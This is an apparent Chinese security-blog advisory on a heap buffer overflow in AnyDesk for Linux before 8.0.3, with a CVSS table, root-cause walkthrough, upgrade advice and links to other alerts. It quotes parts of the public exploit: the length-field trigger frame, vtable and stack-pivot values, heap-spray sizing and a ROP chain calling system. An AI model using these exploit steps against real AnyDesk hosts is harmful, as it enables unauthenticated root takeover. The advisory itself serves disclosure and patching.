#  【漏洞预警】AnyDesk Linux存在堆缓冲区溢出漏洞(POC已公开)  
YGnight
                    YGnight  night安全   2026-10-14 01:01  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LAQpgdWQSctVS8Ps0NsFTqMiasz8uDibcvoib0spt17ORFYGT7Lk8y0JElHpWukiczXboIicO8mrOUut0DwfE4PvMwpuReeibS0yQHqN8Tictdm4Z4/640?wx_fmt=png&from=appmsg "")  
  
## 一、漏洞描述  
  
AnyDesk 是装机量很大的远程桌面工具，Linux 版在系统里以服务方式常驻。  
  
这个服务默认跑在 root 权限下，同时在 TCP 7070 上收连接。  
  
8.0.3 之前的版本里，会话协议处理 mode-5 流数据包的地方留了个口子。  
  
远端在包里携带的一个长度值被直接拿去用，核对排在了后面。  
  
结果是入口落在 AnyDesk 自己的服务上。发起方不需要任何账号，也不需要桌面那一侧点头同意共享屏幕。  
  
CVE 编号为 CVE-2026-109390，MITRE 在 2026 年 10 月 12 日发布了这条记录。  
  
归类 CWE-130。CVSS 3.1 打分 9.8，向量 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H，评分方同为 MITRE。  
  
NVD 上这条记录目前还是 Received 状态，尚未给出自己的评分。  
  
CISA 的 SSVC 记录给了三项取值，利用成熟度 poc，自动化可行性 yes，技术影响 total。  
  
受影响区间按 NVD 记录是 8.0.0 起、8.0.3 之前，平台 Linux。  
  
公开利用代码的实测对象是 8.0.2，运行环境 Linux x86_64，服务以 service 模式启动。  
  
该构建的二进制 SHA-256 为 62ee04ad48dc039dd9c927f998e56143c87a9c5e12d28654f78c7f6340394f5a。  
  
8.0.1 是否带同一处问题，公开材料只提到可能存在相同的代码，没有实测结论。  
  
厂商早在同年 6 月就已经推送了 8.0.3，公开利用代码直到 10 月 8 日才放出。  
  
公开情报里暂无已观测到的在野利用记录。  
<table><tbody><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">CVE 编号</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">CVE-2026-109390</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">漏洞类型</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">堆缓冲区溢出，CWE-130，长度参数处理不一致</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">影响组件</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">AnyDesk Linux 会话协议的 mode-5 流数据包处理逻辑</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">受影响版本</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(220, 38, 38);font-weight: bold;"><section><span leaf="">NVD 记录 8.0.0 起至 8.0.3 之前，平台 Linux；公开利用实测 8.0.2</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">修复版本</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(146, 64, 14);font-weight: bold;"><section><span leaf="">8.0.3</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">触发前提</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">TCP 7070 网络可达，AnyDesk 以服务模式常驻</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">利用条件</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">无需认证，无需用户交互，无需对方同意桌面控制</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">危害面</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">以服务进程权限执行任意命令，Linux 下该进程通常为 root</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">CVSS</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">9.8，CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H，评分来源 MITRE</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">在野利用</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">公开情报中暂无已观测到的在野利用记录</span></section></td></tr></tbody></table>## 二、漏洞原理  
  
握手结束之后，服务端给这条连接分配一个流 id，后续的数据包都挂在它上面。  
  
流上的 mode-5 包共五段。  
  
// mode-5 数据包在已分配流上的布局  
u16be   frame_len           整个帧的字节数  
u16be   stream_id           握手时服务端分配的流 id  
u8      mode_prefix        固定 0x00  
varint  declared_len       本包声明的载荷长度  
u8[]    body               实际跟过来的数据  
// 32 位加法在这一步进位被丢掉  
0xfffffff0 + 0x10 = 0x1_0000_0000  
保留低 32 位      = 0x00000000  
  
声明值走的是变长整数编码，7 位一格，公开脚本里这段是自己实现的。  
  
// exploit/anydesk_proto/frames.py  
def encode_varint(value):  
    out = bytearray()  
    while True:  
        byte = value & 0x7F  
        value >>= 7  
        if value:  
            out.append(byte | 0x80)  
        else:  
            out.append(byte)  
            return bytes(out)  
def build_mode5_payload(payload):  
    return encode_varint(len(payload)) + payload  
  
0xfffffff0 用这种编码只占五个字节，外面那层帧可以小到几十字节。攻击者不用真发四个 G，数字写进去就够了。  
  
下面这段按公开描述还原，不是厂商源码，也没有在本机执行。  
  
// 按公开描述还原的处理流程  
declared = read_varint(p)           // 0xfffffff0，未与帧剩余长度比对  
alloc_sz = declared + 0x10          // 32 位加法，进位丢弃  
obj = malloc(alloc_sz)              // 拿到 0 字节  
obj->data = (char *)obj + 0x10      // 数据区仍按 16 字节头后移  
obj->len  = declared                // 逻辑长度保留原值  
memcpy(obj->data, body, body_len) // 写入越过堆块边界  
  
0xfffffff0 到 0xffffffff 这一段声明值都能触发，算出来的分配大小落在 0 到 15 字节。  
  
对象这边留着原本那个巨大的长度，指针照旧从分配起点往后挪 16 字节，多出来的部分写到了别人头上。  
  
触发包本身很短，脚本里只拼了一个几十字节的对象。  
  
// exploit/anypwn.py  
MODE5_TRIGGER_DECLARED_LEN = 0xFFFF_FFF0  
mode5_prefix = encode_varint(MODE5_TRIGGER_DECLARED_LEN)  
body = (  
    b"C" * 0x10  
    + p64(offsets["target_vtable"])  
    + p64(0xFF)  
    + p64(0)  
    + p64(0xD001)  
    + p64(offsets["stack_pivot"])  
)  
payload = STREAM_MODE_PREFIX + mode5_prefix + body  
frame = build_stream_payload(stream_id, payload)  
client.send_raw(frame)  
  
前面那 16 个 C 用来填满对象头，后面四个值依次是虚函数表指针、引用计数、零值和一个 0xD001 标记，最后那个是栈迁移跳板。  
  
这些地址连同 vtable 与各条 gadget 写死在脚本开头的字典里，全部取自 8.0.2 这一个构建。  
  
溢出要有用，前提是某个受害者对象正好挨着那块被算小的内存。  
  
脚本先把分配器的常见尺寸铺满，从 1 字节到 0x17f1 字节，每 16 字节一档，每档发 100 个对象，之后再另开十条连接放候选受害者。  
  
后面的 ROP 部分解决落点问题。同样一份对象连发二十份，每份前面是一长串 ret 指令地址，中间才是真正的调用链。  
  
调用链本身做的事不复杂，命令字符串按 8 字节一组写进固定地址，地址放进第一个参数，跳去执行 system。  
  
这是一趟概率活。内存布局没凑上的时候，服务进程会直接崩掉，命令不会跑起来。  
## 三、修复建议  
  
Linux 上的 AnyDesk 升到 8.0.3 及以上  
## 近期值得重点关注的漏洞预警  
  
[【紧急漏洞预警】nacos爆出权限绕过漏洞，可以创建管理员账户，经过分析有点出处（已复现，exp脚本已编写）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486343&idx=1&sn=b67c4eb02c03af9c3b206b1241ff7e9c&scene=21#wechat_redirect)  
  
  
[【漏洞预警】macOS爆出路径穿越漏洞CVE-2026-84568(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486490&idx=1&sn=1009bcc6cb5416474ffa0a4f499bf67a&scene=21#wechat_redirect)  
  
  
[PostgreSQL爆出远程代码执行漏洞(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486480&idx=1&sn=31416416494b366dc85cf4d20e0ab3ee&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Atlassian八款产品爆任意文件读取漏洞(附POC)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486475&idx=1&sn=3c669c88388236c2af996ceb9782e928&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Joomla视频画廊扩展存在SQL注入漏洞(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486469&idx=1&sn=6146142b1b0095532a2d87dcbcf738df&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Roundcube网页邮件客户端存在SQL注入漏洞(附POC)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486464&idx=1&sn=93e0df392b292c72408f2c33cfb868ca&scene=21#wechat_redirect)  
  
  
[WordPress页面模板存在文件包含漏洞(POC已公开)CVE-2026-87902](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486459&idx=1&sn=5dc658a83a772526773f3e87b1ac8ad0&scene=21#wechat_redirect)  
  
  
[WordPress插件Forminator未认证短代码执行漏洞(poc已公开)CVE-2026-92229](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486454&idx=1&sn=64894c978fbfac86c914945580147bd9&scene=21#wechat_redirect)  
  
  
[WordPress插件Authorizer存在权限提升漏洞(POC已公开)CVE-2026-81294](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486449&idx=1&sn=20a4f9a399ae34e07a27c7b6d2049e45&scene=21#wechat_redirect)  
  
  
[WordPress插件MStoreAPI存在认证绕过漏洞(POC已公开)CVE-2026-13447](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486444&idx=1&sn=a22077edeab35852d6791825ebba8b10&scene=21#wechat_redirect)  
  
  
[CakePHP爆出SQL注入漏洞(POC已公开)CVE-2026-77635](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486439&idx=1&sn=5030655c1d40e179369ab972ddd5dfc9&scene=21#wechat_redirect)  
  
  
[Node.js模块proxy-addr爆出严重漏洞CVE-2026-90711](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486429&idx=1&sn=fc1772f8703bdd4128ac829c1ae8b371&scene=21#wechat_redirect)  
  
  
[Langflow爆出代码执行漏洞CVE-2026-17633  (POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486424&idx=1&sn=0fec55e718cb9fb60eb91ca24307fd1a&scene=21#wechat_redirect)  
  
  
[Apache CVE-2026-42536，补它只用一行，洞龄十四年](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486419&idx=1&sn=393b6baeea4f624ffa8440058c0d324e&scene=21#wechat_redirect)  
  
  
[【紧急】搜狗输入法爆出远程代码执行漏洞CVE-2026-51990  ，已被在野利用](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486413&idx=1&sn=0b2c6a470a165f288873fa6bace1d77b&scene=21#wechat_redirect)  
  
  
[【紧急】无需登录就能获取 GitLab 的任意文件数据(附POC)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486408&idx=1&sn=06f47231a649e03866f9e9524b5469a4&scene=21#wechat_redirect)  
  
  
[【紧急】JumpServer堡垒机被公布Access Key泄露漏洞，可以实现提权](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486403&idx=1&sn=8e4dc6a684e95b9dc5871b1aca487a57&scene=21#wechat_redirect)  
  
  
[Spring Cloud Azure公布严重漏洞 无需任何权限即可取得登录会话](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486398&idx=1&sn=c64f6f82f75da584d032b99509ffc726&scene=21#wechat_redirect)  
  
  
[【漏洞POC已公开】Linux RDS 爆出提权漏洞 一块内存放两次，root就到手了](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486393&idx=1&sn=629bab1cc81fbee25e8e6dd558ee155b&scene=21#wechat_redirect)  
  
  
[Tenda光猫爆出严重漏洞，目前无补丁(POC已公布](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486388&idx=1&sn=eb210feb27b85439b53b10e595f7667e&scene=21#wechat_redirect)  
  
  
[13 行补丁，堵住Linux能拿 root 的内核洞(EXP已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486383&idx=1&sn=a87059fbbca283a7bd64ad78280ed00a&scene=21#wechat_redirect)  
  
  
[48 字节，换走一台 Windows 的 SYSTEM(CVE-2026-62735漏洞POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486378&idx=1&sn=f9e17fe32b6a3c67249fb4f037a3f1c6&scene=21#wechat_redirect)  
  
  
[【漏洞预警】linux删个网桥就能提权root？目前没有补丁(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486373&idx=1&sn=5f8bb9b0ff7c9fad75a8071c026b9f93&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Linux三年前补上的洞，又一次被挖开了](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486368&idx=1&sn=337dc5fa148d0b24e7dbd352a71e184f&scene=21#wechat_redirect)  
  
  
[【情报】支付宝8.2亿数据泄露？给同事说一声，别自己吓自己](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486362&idx=1&sn=927fdf3d81c79a2ff8871086f0e78a8b&scene=21#wechat_redirect)  
  
  
[【漏洞预警】自己注册个号，就能搬空别人的 Magento 订单和支付卡（POC已公开）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486363&idx=1&sn=344a1f2e1a64b3b3be1509610edd2a0d&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Next.js 爆出新漏洞，不用登录实现命令执行(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486348&idx=1&sn=350cb257c3bfc3372e2dd50f2eb13738&scene=21#wechat_redirect)  
  
  
[【漏洞补丁绕过预警】Redis CVE-2026-23479变种高危漏洞，EXP已公开](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486299&idx=1&sn=7d1d8a95dad56cb021c2aa4ff549ee62&scene=21#wechat_redirect)  
  
  
[【漏洞补丁绕过】超 30 万 WordPress 站点受影响，Forminator 文件上传漏洞（附POC）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486304&idx=1&sn=a22d6632366218b72fd68b3a5cb91557&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Exchange爆出RCE漏洞，利用Exchange 帮另一台 Exchange 开门（POC已公开）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486323&idx=1&sn=124dd54f863f64371f18c668d52e1fab&scene=21#wechat_redirect)  
  
  
[【漏洞预警】不用登录，一个请求就能让 GeoServer 乖乖执行命令（POC已公开）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486318&idx=1&sn=b478f775998b89579c53d4e0fbdc8c6e&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Keycloak不登录就能接管任意账户，双重验证也拦不住](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486309&idx=1&sn=d5c1a812f00448d397d3e3a8e78cdd45&scene=21#wechat_redirect)  
  
  
[【漏洞预警】 8月WebLogic公布了9个漏洞，有一个需要重点关注](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486294&idx=1&sn=eb26bc5f8fcafc9ab402b77acdb1b2a4&scene=21#wechat_redirect)  
  
  
[【漏洞预警】近期MongoDB 公布了5个漏洞，最严重的一个可以不认证、远程就能拿下你电脑](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486289&idx=1&sn=10023bdd570d9f011eef242a23f83bb6&scene=21#wechat_redirect)  
  
  
[【0DAY漏洞】 全球5G手机芯片厂商之一‌的紫光展锐SOC存在RCE漏洞，影响数十家手机厂商，还未发布补丁](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486279&idx=1&sn=5e1452f6984bf3d4b4d35a2240676df5&scene=21#wechat_redirect)  
  
  
[【漏洞告警】安卓 14 到 16 全中招，通讯录 SQL 注入漏洞正在抄家（POC已公开）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486274&idx=1&sn=4bacf56f2045fca36b7b3de4be3ae591&scene=21#wechat_redirect)  
  
  
[【漏洞预警】紧急排查，SMB服务再曝新漏洞，利用脚本已公开](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486251&idx=1&sn=633ed2b7d916bcf98404a7b3a9a8c4b4&scene=21#wechat_redirect)  
  
  
[【漏洞预警】不用输密码，对方已经接管你的Mac：官方补丁公布macOS存在未鉴权RCE漏洞](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486246&idx=1&sn=eaf0c51686e92e89826098fcf51fb959&scene=21#wechat_redirect)  
  
  
[【0day漏洞预警】MariaDB 13 爆 9.8 分 RCE 链：最低 USAGE 权限就能远程执行命令](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486225&idx=1&sn=bd13754fd9378e01a088cf996fa5b557&scene=21#wechat_redirect)  
  
  
[VMware 爆 5 个洞，两个 9.8 不用密码就能打穿 vCente](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486204&idx=1&sn=2590e283b0981541da74647ddc817282&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LAQpgdWQSctTWicwicwovsVtMLAjYPfEB9lMRmJJiaIozWIuicwrbneXZ3pGly4lRNAd1WrP6AKYA925Iz4c1EbnMLCOqWzkCmdCLXDQibsG4VQw/640?wx_fmt=png&from=appmsg "")  
  
